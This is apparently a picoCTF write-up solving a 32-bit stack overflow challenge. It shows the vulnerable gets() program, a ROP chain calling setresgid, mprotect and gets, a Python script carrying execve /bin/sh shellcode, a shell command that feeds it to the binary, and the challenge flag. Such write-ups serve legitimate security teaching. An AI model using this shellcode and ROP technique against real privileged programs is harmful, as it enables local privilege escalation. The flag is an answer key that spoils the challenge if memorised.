## exploit

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("GIVE ME YOUR NAME!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

The vuln program is an  elf 32-bit file statically linked.
With checksec I discovered NX bit enabled with no canary so we can exploit this program in very different ways.

ASLR is enabled.

Obviusly I focused on vuln function.

I decided for this exploit to make a rop chain that:
* call setresgid with correct id in order to drop the right privileges to read the flag file
* call `mprotect` function in order to get bss section `RWX`
* call `gets` function and pass shellcode in the area passed as argument to mprotect function
* insert shellcode via stdin


from ropper I selected one gadget that simply performs 3 `pop` and one `ret`, in order to have the right stack layout for each functions above.

So here some addresses: 
```
	0806cc40 - setresgid
	0806f050 - pop pop pop ret gadget - used between the calls to clean stak layout.
	0806e0f0 - mprotect
	0804f120 - gets
```

To bypass NX bit I decided to makes the first 0x100 bytes of the bss rwx starting from `0x080e0000`.

The next gets function takes this address as arguments and via stdin passed the shellcode that simply execve `/bin/sh`.

Gets function will reads a line from stdin until `0x0a` is reached, so to pass the shellcode I simply insert a `0x0a` byte between rop string and shellcode.



Here `att.py` file:


```python

a="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x40\xcc\x06\x08"*2+"\x50\xf0\x06\x08"+"\xe8\x03\x00\x00"*3+"\xf0\xe0\x06\x08"+"\x50\xf0\x06\x08"+"\x00\xb0\x0e\x08" + "\x00\x01\x00\x00" + "\x07\x00\x00\x00"+"\x20\xf1\x04\x08"+"\x00\xb0\x0e\x08"*4+"\x0a"
a+="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print(a)
```

```bash
$ (python /tmp/a/att.py;cat) |  ./gets
```

##### flag: picoCTF{rOp_yOuR_wAY_tO_AnTHinG_cfdfc687}














